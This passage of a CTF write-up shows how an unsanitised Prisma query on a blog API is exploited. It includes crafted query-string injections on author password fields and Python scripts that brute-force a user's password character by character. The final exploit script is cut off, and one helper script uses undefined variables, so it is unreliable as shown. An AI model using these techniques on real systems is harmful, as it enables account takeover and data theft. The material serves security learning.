        <span class="na">body</span><span class="p">:</span> <span class="s2">`Getting fit can feel overwhelming, but it doesn’t have to be. Start small: commit to a 10-minute walk daily or try a beginner-friendly workout video. Focus on consistency over intensity. Remember, progress takes time, so celebrate small wins along the way. Your future self will thank you for taking that first step today!`</span><span class="p">,</span>
        <span class="na">authorId</span><span class="p">:</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="nx">NUM_USERS</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
        <span class="na">published</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">title</span><span class="p">:</span> <span class="s2">`The Magic of Morning Routines`</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="s2">`What do successful people have in common? A solid morning routine. Whether it’s journaling, meditating, or a quick workout, starting your day intentionally sets the tone for productivity and positivity. Don’t overthink it—pick one activity that energizes you and stick with it. Mornings are your power hour; how will you use yours?`</span><span class="p">,</span>
        <span class="na">authorId</span><span class="p">:</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="nx">NUM_USERS</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
        <span class="na">published</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">title</span><span class="p">:</span> <span class="s2">`5 Quick Ways to Declutter Your Space`</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="s2">`A cluttered space can lead to a cluttered mind. Here’s how to simplify:

Apply the “one in, one out” rule for new purchases.
Dedicate 10 minutes a day to tidying up.
Donate items you haven’t used in a year.
Invest in smart storage solutions.
Remember: less is more.
Decluttering isn’t just about cleaning—it’s about creating a space that inspires calm and focus.`</span><span class="p">,</span>
        <span class="na">authorId</span><span class="p">:</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="nx">NUM_USERS</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
        <span class="na">published</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">title</span><span class="p">:</span> <span class="s2">`Why Soft Skills Are the Secret to Career Growth`</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="s2">`Technical skills may get your foot in the door, but soft skills will take you further. Communication, adaptability, and emotional intelligence are increasingly valued in today’s workplace. Why? Because they foster collaboration and help you navigate challenges effectively. Want to stand out in your career? Work on your soft skills—they’re just as crucial as hard ones.`</span><span class="p">,</span>
        <span class="na">authorId</span><span class="p">:</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="nx">NUM_USERS</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
        <span class="na">published</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">title</span><span class="p">:</span> <span class="s2">`3 Reasons You Should Start Journaling`</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="s2">`Feeling overwhelmed? Journaling might be the outlet you need. It helps you:

Clarify your thoughts and emotions.
Track personal growth and progress.
Spark creativity by putting ideas to paper.
You don’t need fancy notebooks or hours of time—just a few minutes a day can make a big difference. Start writing and see where it takes you!`</span><span class="p">,</span>
        <span class="na">authorId</span><span class="p">:</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="nx">NUM_USERS</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
        <span class="na">published</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">title</span><span class="p">:</span> <span class="s2">`How to Beat Procrastination for Good`</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="s2">`Procrastination affects us all, but overcoming it is possible. Start by breaking tasks into smaller, manageable chunks. Use techniques like the Pomodoro timer to stay focused, and reward yourself for completing milestones. Most importantly, don’t aim for perfection—progress is what counts. The best time to start? Right now.`</span><span class="p">,</span>
        <span class="na">authorId</span><span class="p">:</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="nx">NUM_USERS</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
        <span class="na">published</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">title</span><span class="p">:</span> <span class="s2">`The Future of Remote Work`</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="s2">`The shift to remote work has changed the way we view the workplace. Flexibility and work-life balance are now top priorities for employees, while companies are investing in tools to keep teams connected. But with this freedom comes challenges—like maintaining productivity and avoiding burnout. The future of work is hybrid, but how can we make it truly sustainable for everyone?`</span><span class="p">,</span>
        <span class="na">authorId</span><span class="p">:</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="nx">NUM_USERS</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
        <span class="na">published</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">title</span><span class="p">:</span> <span class="s2">`The Flag`</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="s2">`This is a secret blog I am still working on. The secret keyword for this blog is </span><span class="p">${</span><span class="nx">FLAG</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span>
        <span class="na">authorId</span><span class="p">:</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="nx">NUM_USERS</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
        <span class="na">published</span><span class="p">:</span> <span class="kc">false</span>
    <span class="p">}</span>
<span class="p">];</span>

<span class="p">(</span><span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">await</span> <span class="nx">prisma</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nf">createMany</span><span class="p">({</span><span class="na">data</span><span class="p">:</span> <span class="nx">USERS</span><span class="p">});</span>
    <span class="k">await</span> <span class="nx">prisma</span><span class="p">.</span><span class="nx">post</span><span class="p">.</span><span class="nf">createMany</span><span class="p">({</span><span class="na">data</span><span class="p">:</span> <span class="nx">POSTS</span><span class="p">});</span>
<span class="p">})();</span>
</pre></td></tr></tbody></table></code></div>  </div>

</details>

<details id="schemaprisma">
  <summary>schema.prisma</summary>

  <div file="schema.prisma" class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="schema.prisma"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre>datasource db {
  provider = "sqlite"
  url      = "file:./database.db"
}

generator client {
  provider = "prisma-client-js"
}

model User {
  id        Int      @id @default(autoincrement())
  createdAt DateTime @default(now())
  name      String   @unique
  password  String
  posts     Post[]
}

model Post {
  id        Int      @id @default(autoincrement())
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt
  published Boolean  @default(false)
  title     String   
  body      String
  author    User    @relation(fields: [authorId], references: [id])
  authorId  Int
}
</pre></td></tr></tbody></table></code></div>  </div>

</details>

<h3 id="interesting-points"><span class="me-2">Interesting Points</span><a href="#interesting-points" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>After reading the source I noticed some interesting things:</p>

<ol>
  <li><a href="#seedjs">Seed.js</a>:
    <ul>
      <li>There are <strong>4 users</strong> <em>(White, Bob, Tommy and Sam)</em> with random generated passwords</li>
      <li>We have the <strong>set of character used</strong> to make their passwords</li>
      <li>Flag is a <strong>private post of random(White, Bob, Tommy, Sam)</strong></li>
    </ul>
  </li>
  <li><a href="#indexjs">Index.js</a>:
    <ul>
      <li>Our query is directly passed to Prisma <strong>without sanitization</strong> in <code class="language-plaintext highlighter-rouge">/api/posts</code></li>
      <li>Only <strong>2 routes</strong> (<code class="language-plaintext highlighter-rouge">/api/posts</code> and <code class="language-plaintext highlighter-rouge">/api/login</code>)</li>
      <li>You can see <strong>all posts</strong> (<strong>EXCEPT</strong> unpublished ones) in <code class="language-plaintext highlighter-rouge">/api/posts</code></li>
      <li>You can see <strong>all posts</strong> (<strong>EVEN</strong> unpublished ones) written by the author after login in <code class="language-plaintext highlighter-rouge">/api/login</code></li>
    </ul>
  </li>
</ol>

<p>So we can either:</p>
<ul>
  <li>Try to “hack” <strong>the SQL query</strong> to display unpublished posts</li>
  <li>Try to “hack” <strong>the accounts</strong> to login and see their posts</li>
</ul>

<h3 id="identifying-vulnerabilities"><span class="me-2">Identifying vulnerabilities</span><a href="#identifying-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>I started by looking at the <code class="language-plaintext highlighter-rouge">/api/posts</code> code to look for vulnerabilities in the SQL query. This part is interesting:</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="kd">let</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>
<span class="nx">query</span><span class="p">.</span><span class="nx">published</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">posts</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">prisma</span><span class="p">.</span><span class="nx">post</span><span class="p">.</span><span class="nf">findMany</span><span class="p">({</span><span class="na">where</span><span class="p">:</span> <span class="nx">query</span><span class="p">});</span>

<span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">posts</span><span class="p">})</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Our query is taken, then the published parameter is passed to true, so in the <strong>SQL query</strong> a <code class="language-plaintext highlighter-rouge">WHERE published = true</code> will be added. I tried googling around, but it seems that we can’t bypass that to display the flag …</p>

<p><strong>BUT</strong> there’s still a problem ! The user query is <strong>directly passed to prisma</strong> without any sanitization. It means that we can send JSON through the URL to trick the ORM ! After reading the <a href="https://www.prisma.io/docs/orm/">prisma doc</a> I made this url:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">http://TARGET_URL/api/posts?author[name]=Bob</code></li>
</ul>

<p>The query string will be translated to this JSON:</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="p">{</span>
    <span class="nl">author</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Bob</span><span class="dl">"</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>So JavaScript will execute this ORM request:</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="kd">let</span> <span class="nx">posts</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">prisma</span><span class="p">.</span><span class="nx">post</span><span class="p">.</span><span class="nf">findMany</span><span class="p">({</span> <span class="na">where</span><span class="p">:</span> <span class="p">{</span>
    <span class="na">author</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Bob</span><span class="dl">"</span>
    <span class="p">},</span>
    <span class="na">published</span><span class="p">:</span> <span class="kc">true</span>
<span class="p">}});</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We basically have control over the where condition, we can put whatever we want in it !</p>

<p><a href="/assets/img/writeups/uoftctf/vuln.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/uoftctf/vuln.png" alt="image"  loading="lazy"></a>
<em>We can show posts associated to Bob for example !</em></p>

<h1 id="exploitation">Exploitation</h1>

<h3 id="exploiting-the-vulnerability"><span class="me-2">Exploiting the vulnerability</span><a href="#exploiting-the-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Ok but what next ?</p>

<p>Reading the <a href="https://www.prisma.io/docs/orm/prisma-client/queries/filtering-and-sorting">Prisma doc</a> I found a lot of interesting operators that we could use. 
We know <em>(from the <a href="#schemaprisma">Schema.prisma</a>)</em> that each post is associated with a user (the author), and that this user have a password. We could simply try to exfiltrate this password from the posts table by taking the author, then grabbing it’s password. Let’s use the <code class="language-plaintext highlighter-rouge">startsWith</code> operator for example:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">http://TARGET_URL/api/posts?author[name]=Bob&amp;author[password][startsWith]=a</code></li>
</ul>

<p>That’ll be translated to:</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="p">{</span>
    <span class="nl">author</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Bob</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">password</span><span class="p">:</span> <span class="p">{</span>
            <span class="na">startsWith</span><span class="p">:</span> <span class="dl">"</span><span class="s2">a</span><span class="dl">"</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>resulting in this Prisma query:</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="kd">let</span> <span class="nx">posts</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">prisma</span><span class="p">.</span><span class="nx">post</span><span class="p">.</span><span class="nf">findMany</span><span class="p">({</span> 
    <span class="na">where</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">author</span><span class="p">:</span> <span class="p">{</span>
            <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Bob</span><span class="dl">"</span><span class="p">,</span>
            <span class="na">password</span><span class="p">:</span> <span class="p">{</span>
                <span class="na">startsWith</span><span class="p">:</span> <span class="dl">"</span><span class="s2">a</span><span class="dl">"</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">published</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">}</span>
<span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/writeups/uoftctf/dontstartswith8.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/uoftctf/dontstartswith8.png" alt="!image"  loading="lazy"></a></p>

<p>As you can see, nothing is returned, that means that the Bob’s password don’t start with <code class="language-plaintext highlighter-rouge">a</code>. 
I tried <code class="language-plaintext highlighter-rouge">b</code>, <code class="language-plaintext highlighter-rouge">c</code>, <code class="language-plaintext highlighter-rouge">d</code> … And got a hit with 8, meaning that Bob’s password starts with 8 !</p>

<p><a href="/assets/img/writeups/uoftctf/startsWith8.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/uoftctf/startsWith8.png" alt="image"  loading="lazy"></a></p>

<p>So now we can try <code class="language-plaintext highlighter-rouge">8a</code>, <code class="language-plaintext highlighter-rouge">8b</code>, <code class="language-plaintext highlighter-rouge">8c</code> and so on … Let’s automate this with python.</p>

<h3 id="scripting-case-unsensitive"><span class="me-2">Scripting (case unsensitive)</span><a href="#scripting-case-unsensitive" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>So I wrote this simple script</p>

<details>

  <summary>brute.py</summary>

  <div file="brute.py" class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="brute.py"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">requests</span> <span class="kn">import</span> <span class="n">get</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="n">log</span> 

<span class="c1"># Set of character used (read the seeder.js file)
</span><span class="n">chars</span> <span class="o">=</span> <span class="sh">"</span><span class="s">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="sh">"</span>
<span class="c1"># One of the four users
</span><span class="n">username</span><span class="o">=</span><span class="sh">"</span><span class="s">Bob</span><span class="sh">"</span>
<span class="n">passw</span> <span class="o">=</span> <span class="sh">""</span>

<span class="c1"># We know that the password is maximum 24 char (see seed.js)
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
    <span class="c1"># Go through every possible char of the set of character
</span>    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
        <span class="c1"># Make the url
</span>        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://TARGET_URL/api/posts?author[name]=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;author[password][startsWith]=</span><span class="si">{</span><span class="n">passw</span><span class="o">+</span><span class="n">char</span><span class="si">}</span><span class="sh">"</span> 
        <span class="n">req</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

        <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">passw</span><span class="o">+</span><span class="n">char</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

        <span class="c1"># If something is returned, that means that it's the correct char
</span>        <span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">posts</span><span class="sh">"</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>
            <span class="n">passw</span> <span class="o">+=</span> <span class="n">char</span>
            <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">FOUND: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">passw</span><span class="p">)</span>
            <span class="k">break</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">FINAL: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">passw</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div>  </div>

</details>

<p>I launched the script, waited a bit …
<a href="/assets/img/writeups/uoftctf/onlycaps.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/uoftctf/onlycaps.png" alt="image"  loading="lazy"></a></p>

<p>After a few minutes (yes my network is that bad …) the script told me “Bob’s password is <code class="language-plaintext highlighter-rouge">8AXCGMISH5ZN59RSXJM</code>”. 
So let’s try to login to the <code class="language-plaintext highlighter-rouge">/api/login</code> endpoint with it:</p>

<p><a href="/assets/img/writeups/uoftctf/nah.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/uoftctf/nah.png" alt="image"  loading="lazy"></a></p>

<p>Did you noticed something ? There is no lowercases in our password. So I guess the <code class="language-plaintext highlighter-rouge">startsWith</code> and <code class="language-plaintext highlighter-rouge">endsWith</code> are <strong>case-insensitive</strong>.
Let’s try a different operator:</p>

<p><a href="/assets/img/writeups/uoftctf/equalsno.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/uoftctf/equalsno.png" alt="image"  loading="lazy"></a></p>

<p>When I put <code class="language-plaintext highlighter-rouge">equals</code>, it doesn’t return anything ! So I guess <code class="language-plaintext highlighter-rouge">equals</code> is <strong>case-sensitive</strong> as well as the <code class="language-plaintext highlighter-rouge">/api/login</code> endpoint ! We need to find a way to detect if each character is lowercase or uppercase, but how ?</p>

<h3 id="scripting-case-sensitive"><span class="me-2">Scripting (case sensitive)</span><a href="#scripting-case-sensitive" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Fortunately we can put whatever we want in the were clause cause there is no sanitization… So basically we have an <strong>SQL</strong> query with <code class="language-plaintext highlighter-rouge">WHERE X AND published=true</code> and the <code class="language-plaintext highlighter-rouge">X</code> is entirely controlled by us ! 
And fortunately, prisma comes with a ton of operator. To mitigate the case-insne… insin… The <strong>case that is not sensitive</strong> problem, we can use the <code class="language-plaintext highlighter-rouge">gt</code> (greater than) and <code class="language-plaintext highlighter-rouge">lt</code> (lower than) operators:</p>

<p>Using this request we can test wether the character is lowercase or uppercase:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">http://TARGET_URL/api/posts?author[name]=Bob&amp;author[password][gt]=8a&amp;author[password][lt]=8z</code></li>
</ul>

<p>That will be converted to</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="p">{</span>
    <span class="nl">author</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Bob</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">password</span><span class="p">:</span> <span class="p">{</span>
            <span class="na">gt</span><span class="p">:</span> <span class="dl">"</span><span class="s2">8a</span><span class="dl">"</span><span class="p">,</span>
            <span class="na">lt</span><span class="p">:</span> <span class="dl">"</span><span class="s2">8z</span><span class="dl">"</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Let’s take a look:
<a href="/assets/img/writeups/uoftctf/so_its_not_caps.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/uoftctf/so_its_not_caps.png" alt="image"  loading="lazy"></a>
<em>Check if the character is between a and z (<strong>check if the character is lowercase</strong>)</em></p>

<p><a href="/assets/img/writeups/uoftctf/so_its_upper.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/uoftctf/so_its_upper.png" alt="image"  loading="lazy"></a>
<em>Check if the character is between A and Z (<strong>check is the character is uppercase</strong>)</em></p>

<p>As you can see the second request returns something, that means that the <code class="language-plaintext highlighter-rouge">z</code> character is between <code class="language-plaintext highlighter-rouge">A</code> and <code class="language-plaintext highlighter-rouge">Z</code>. Therefore, it’s uppercase.
We can repeat the operation for every character. So I scripted it:</p>

<details>

  <summary>gather_case_sensitivity_test.py</summary>

  <div file="gather_case_sensitivity.py" class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="gather_case_sensitivity.py"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">requests</span> <span class="kn">import</span> <span class="n">get</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="n">log</span> 

<span class="n">log</span><span class="p">.</span><span class="nf">warning</span><span class="p">(</span><span class="sh">"</span><span class="s">Gathering case sensitivity</span><span class="sh">"</span><span class="p">)</span>
<span class="n">passw</span> <span class="o">=</span> <span class="sh">"</span><span class="s">8AXCGMISH5ZN59RSXJM</span><span class="sh">"</span>
<span class="n">username</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Bob</span><span class="sh">"</span>

<span class="n">to_test</span> <span class="o">=</span> <span class="sh">""</span>
<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">passw</span><span class="p">:</span>
    <span class="nf">if</span><span class="p">(</span><span class="n">char</span> <span class="ow">in</span> <span class="n">numbers</span><span class="p">):</span>
        <span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span>
        <span class="k">continue</span>

    <span class="n">is_lower_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://TARGET_URL/api/posts?author[name]=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;author[password][gt]=</span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="s">a&amp;author[password][lt]=</span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="s">z</span><span class="sh">"</span>

    <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">is_lower</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">is_lower_url</span><span class="p">)</span>

    <span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">is_uppercase</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">posts</span><span class="sh">"</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>
        <span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span><span class="p">.</span><span class="nf">upper</span><span class="p">()</span>

<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">Password with correct case is: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">to_test</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div>  </div>

</details>

<p>Launch it:
<a href="/assets/img/writeups/uoftctf/testing_case.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/uoftctf/testing_case.png" alt="image"  loading="lazy"></a></p>

<p>Looks like our technique is working !</p>

<h3 id="getting-the-flag"><span class="me-2">Getting the flag</span><a href="#getting-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Here is the final version of the script:</p>

<details>

  <summary>exploit.py</summary>

  <div file="exploit.py" class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="exploit.py"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">requests</span> <span class="kn">import</span> <span class="n">get</span><span class="p">,</span> <span class="n">post</span>
<span class="kn">from</span> <span class="n">sys</span> <span class="kn">import</span> <span class="n">argv</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="n">log</span>
